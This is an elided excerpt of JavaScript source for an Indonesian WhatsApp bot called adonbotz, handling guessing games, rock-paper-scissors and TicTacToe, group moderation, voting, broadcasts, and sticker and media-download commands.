...
module.exports = adonbotz = async (adonbotz, m, chatUpdate, store) => {
await adonbotz.readMessages([m.key])
    ...
    //console.log(nomerOwner)
        ...
        const botNumber = await adonbotz.decodeJid(adonbotz.user.id)
        ...
        // Group
        const groupMetadata = m.isGroup ? await adonbotz.groupMetadata(m.chat).catch(e => {}) : ''
...
green(), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
   ...
   adonbotz.sendMessage(m.chat, {audio: vnnya, mimetype: 'audio/mpeg', ptt:true })
   }
    var vnCreator = (hehe) => {
   vnc = fs.readFileSync(`./src/ga mau.mp3`)
   adonbotz.sendMessage(m.chat, {audio: vnc, mimetype: 'audio/mp3', ptt:true })
   }
	...
	if (db.data.settings[botNumber].autobio) {
		...
		await adonbotz.setStatus(`${adonbotz.user.name} | Runtime : ${runtime(uptime)}`)
	  ...
	  // Anti Link
        ...
        let gclink = (`https://chat.whatsapp.com/`+await adonbotz.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
        adonbotz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
      ...
      return
        ...
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: adonbotz.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, adonbotz.user.id)
        ...
        adonbotz.ev.emit('messages.upsert', msg)
        }
...
${Array.from(room.jawaban, (jawaban, index) => {
    ...
    ${isSurender ? '' : `Perfect Player`}`.trim()
            adonbotz.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
        ...
        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await adonbotz.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, adonbotz.user.name, m)
        ...
        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await adonbotz.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, adonbotz.user.name, m)
        ...
        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await adonbotz.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, adonbotz.user.name, m)
	    ...
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await adonbotz.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, adonbotz.user.name, m)
        ...
        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await adonbotz.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, adonbotz.user.name, m)
        ...
        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await adonbotz.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, adonbotz.user.name, m)
	...
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            ...
            if (budy.toLowerCase() == jawaban) {
                await adonbotz.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, adonbotz.user.name, m)
...
Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    ...
	    if (room.x !== room.o) await adonbotz.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await adonbotz.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
...
const shield2 = {
  ...
  message: {
    "imageMessage": {
	    ...
	    adonbotz.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    ...
	    adonbotz.sendText(m.chat, `Suit telah dikirimkan ke chat
...
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) adonbotz.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) adonbotz.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) adonbotz.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    adonbotz.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    ...
	    if (!roof.pilih2) adonbotz.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) adonbotz.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    ...
	    adonbotz.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}
...
Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            ...
            if (this.game) {
            delete this.game
            adonbotz.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
            } else if (!this.game) {
...
Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await adonbotz.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) adonbotz.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
...
adonbotz.sendMessage(m.chat, {audio: fs.readFileSync('./src/dosa pantek.mp3'), mimetype: 'audio/mpeg', ptt:true })
   }
   break
            case 'chat': {
                ...
                if (args[0] === 'mute') {
                    adonbotz.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    adonbotz.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    adonbotz.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    adonbotz.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    adonbotz.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    adonbotz.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    adonbotz.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
	    case 'family100': {
                ...
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await adonbotz.sendText(m.chat, hasil, m),
                    ...random,
            ...
            case 'tebak': {
                ...
                if (args[0] === "lagu") {
                    ...
                    let msg = await adonbotz.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    adonbotz.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    adonbotz.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, adonbotz.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                    ...
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    adonbotz.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    adonbotz.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, adonbotz.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    ...
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    adonbotz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    adonbotz.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, adonbotz.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                    ...
                    console.log("Jawaban: " + result.jawaban)
                    adonbotz.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, adonbotz.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                    ...
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    adonbotz.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    adonbotz.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, adonbotz.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                    ...
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    adonbotz.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
		    ...
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    ...
                    console.log("Jawaban: " + result.jawaban)
                    adonbotz.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, adonbotz.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            ...
            case 'kuismath': case 'math': {
                ...
                adonbotz.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
...
@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            ...
            let buttons = [
                    ...
                    await adonbotz.sendButtonText(m.chat, buttons, jawab, adonbotz.user.name, m, {mentions: ments})
            }
            break
            case 'jadian': {
            if (!m.isGroup) throw mess.group
...
@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            ...
            let buttons = [
                    ...
                    await adonbotz.sendButtonText(m.chat, buttons, jawab, adonbotz.user.name, m, {mentions: menst})
            }
            break
case 'restart':
if (!isCreator) return
...
break
            case 'react': {
                ...
                adonbotz.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join': {
                if (!isCreator) return
                ...
                await adonbotz.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leave': {
                if (!isCreator) return
                await adonbotz.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) return
	...
	if (!isCreator) return
		...
		await adonbotz.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
	if (!isCreator) return
		...
		await adonbotz.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
	if (!isCreator) return
        ...
        if (!isAdmins) throw vnAdmin(from)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await adonbotz.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
	    if (!isCreator) return
        ...
        if (!isAdmins) throw vnAdmin(from)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await adonbotz.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) return
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await adonbotz.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) return
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await adonbotz.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    ...
	    if (!isCreator) return
                ...
                if (!isAdmins) throw vnAdmin(from)
                if (!text) throw 'Text ?'
                await adonbotz.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          ...
          if (!isCreator) return
                ...
                if (!isAdmins) throw vnAdmin(from)
                if (!text) throw 'Text ?'
                await adonbotz.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setppbot': {
                if (!isCreator) return
                ...
                let media = await adonbotz.downloadAndSaveMediaMessage(quoted)
                await adonbotz.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
           ...
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
                ...
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await adonbotz.downloadAndSaveMediaMessage(quoted)
                await adonbotz.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
...
•━══〘 𝙰𝙳𝙾𝙽𝙱𝙾𝚃𝚉〙══━• `
 ...
 adonbotz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id),
contextInfo: {
externalAdReply: {
title: `©⏤͟͟͞𝙰𝙳𝙾𝙽 𝙱𝙾𝚃𝚉`,
...
sourceUrl: `https://youtube.com/channel/UCfNdfgwxDm05O9HzdHg7AXw`,
thumbnailUrl: `https://i.ibb.co/xHbpXYS/IMG-20221103-WA0008.jpg`
}}})
}
break
                case 'hidetag': {
                if (!isCreator) return
            if (!m.isGroup) throw mess.group
            adonbotz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
         case 'tag': {
                if (!isCreator) return
            if (!m.isGroup) throw mess.group
            adonbotz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: shield2 })
            jancok(`Tag Aja`)
            }
            break
...
let buttonsVote = [
  ...
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ...
            let buttonMessageVote = {
                text: teks_vote,
                footer: adonbotz.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            adonbotz.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
...
*${prefix}hapusvote* - untuk menghapus vote`
            ...
            adonbotz.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
...
*${prefix}hapusvote* - untuk menghapus vote`
            ...
            adonbotz.sendMessage(m.chat, buttonMessageDevote)
	}
            break
...
©${adonbotz.user.id}
`
adonbotz.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            ...
            break
               case 'group': case 'grup': {
                ...
                if (!isAdmins) throw vnAdmin(from)
                if (args[0] === 'close'){
                    await adonbotz.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await adonbotz.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await adonbotz.sendButtonText(m.chat, buttons, `Mode Group`, adonbotz.user.name, m)
            ...
            case 'editinfo': {
                ...
                if (!isAdmins) throw vnAdmin(from)
             if (args[0] === 'open'){
                await adonbotz.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await adonbotz.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await adonbotz.sendButtonText(m.chat, buttons, `Mode Edit Info`, adonbotz.user.name, m)
...
break
            case 'antilink': {
                ...
                m.reply(`Antilink Tidak Aktif !`)
                 ...
                 let buttons = [
                    ...
                    await adonbotz.sendButtonText(m.chat, buttons, `Mode Antilink`, adonbotz.user.name, m)
                }
             }
             break
             case 'mute': {
                ...
                m.reply(`${adonbotz.user.name} telah di mute di group ini !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = false
                m.reply(`${adonbotz.user.name} telah di unmute di group ini !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await adonbotz.sendButtonText(m.chat, buttons, `Mute Bot`, adonbotz.user.name, m)
                }
             }
             break
            ...
            if (!isCreator) return
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw vnAdmin(from)
                let response = await adonbotz.groupInviteCode(m.chat)
                adonbotz.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                ...
                if (args[0] === 'enable') {
                    await adonbotz.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await adonbotz.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': case 'd': {
                ...
                adonbotz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'bcgc': case 'bcgroup': {
                if (!isCreator) return
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let getGroups = await adonbotz.groupFetchAllParticipating()
                ...
                for (let i of anu) {
                    ...
                    let btn = [{
                                urlButton: {
                                    ...
                                    url: 'https://github.com/DikaArdnt/adonbotz-Morou'
                                }
                            }, {
                                callButton: {
                      ...
                      adonbotz.send5ButImg(i, txt, adonbotz.user.name, global.thumb, btn)
                    }
		...
		for (let yoi of anu) {
		    ...
		    let btn = [{
                      ...
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      adonbotz.send5ButImg(yoi, txt, adonbotz.user.name, global.thumb, btn)
		}
		m.reply('Sukses Broadcast')
            ...
            case 'infochat': {
                ...
                adonbotz.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await adonbotz.serializeM(await m.getQuotedObj())
	    ...
	    break
            case 'listpc': {
             ...
             break
                case 'listgc': {
                 ...
                 for (let i of anu) {
                     let metadata = await adonbotz.groupMetadata(i)
             ...
             case 'listonline': case 'liston': {
                    ...
                    adonbotz.sendText(m.chat, 'List Online:\n\n' + online.map(v => '│➳ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            ...
            m.reply(mess.wait)
                ...
                let encmedia = await adonbotz.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await adonbotz.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
		...
		for (let res of anu.results) {
		    let encmedia = await adonbotz.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	    ...
	    break
	       ...
	       if (!isCreator) return
           if (!text) throw `Example : ${prefix + command} text`
           await adonbotz.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'adonbotz', 'morou', m, {asSticker: true})
        ...
        if (!isCreator) return
 try {
if (args.length == 0) return m.reply(`Example: ${prefix + command} YUadonbotz`)
//let buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
await adonbotz.sendMessage(m.chat, {sticker: {url:`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}` }}, { quoted: m })
} catch (e) {
 console.log(e)
...
break
	       ...
	       if (!isCreator) return
	        ...
	        let FaTiH = await adonbotz.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	       ...
	       break     
            ...
            if (!isCreator) return
                ...
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    ...
                    adonbotz.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
		...
		let { webp2mp4File } = require('./lib/uploader')
                ...
                await adonbotz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
            ...
            adonbotz.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (!isCreator) return
            ...
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            adonbotz.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${adonbotz.user.name}.mp3`}, { quoted : m })
            }
            break
            ...
            adonbotz.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
            if (!isCreator) return
		...
		let { webp2mp4File } = require('./lib/uploader')
                let media = await adonbotz.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await adonbotz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
	    ...
	    localFile = await adonbotz.downloadAndSaveMediaMessage(quoted, hmm)
	    ...
	    adonbotz.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    ...
	    if (!isCreator) return
                ...
                adonbotz.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
        if (!isCreator) return
...
🔗 *Media Url* : ${images}`,
                ...
                adonbotz.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
...
╰━═════════════━•`,
	    ...
	    if (!isCreator) return
                ...
                adonbotz.sendImage(m.chat, media.thumb, `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${isUrl(text)}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '128kbps'}`, m)
                adonbotz.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            ...
            if (!isCreator) return
                ...
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                adonbotz.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `│➳ Title : ${media.title}\n│➳ File Size : ${media.filesizeF}\n│➳ Url : ${isUrl(text)}\n│➳ Ext : MP3\n│➳ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
	    case 'getmusic': {
	    if (!isCreator && !isBan) return
		...
		let { pinterest } = require('./lib/scraper')
                ...
                adonbotz.sendMessage(m.chat, { image: { url: result }, caption: '│➳ Media Url : '+result }, { quoted: m })
            }
            break
            case 'anime': case 'waifu': case 'husbu': case 'neko': case 'shinobu': case 'megumin': case 'waifus': case 'nekos': case 'trap': case 'blowjob': {
            if (!isCreator) return
                m.reply(mess.wait)
                adonbotz.sendMessage(m.chat, { image: { url: api('zenz', '/api/random/'+command, {}, 'apikey') }, caption: 'Generate Random ' + command }, { quoted: m })
            }
            break
	    case 'couple': {
	    if (!isCreator && !isBan) return
                ...
                let random = anu[Math.floor(Math.random() * anu.length)]
                adonbotz.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                adonbotz.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
		...
		let { quotesAnime } = require('./lib/scraper')
            ...
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} text`
                m.reply(mess.wait)
                adonbotz.sendMessage(m.chat, { image: { url: api('zenz', '/textpro/' + command, { text: text }, 'apikey') }, caption: `Text Pro ${command}` }, { quoted: m})
	    }
            break
	    ...
	    if (!isCreator && !isBan) return
                ...
                m.reply(mess.wait)
                adonbotz.sendMessage(m.chat, { image: { url: api('zenz', '/photooxy/' + command, { text: text }, 'apikey') }, caption: `Photo Oxy ${command}` }, { quoted: m })
            }
            break
            ...
            if (!isCreator && !isBan) return
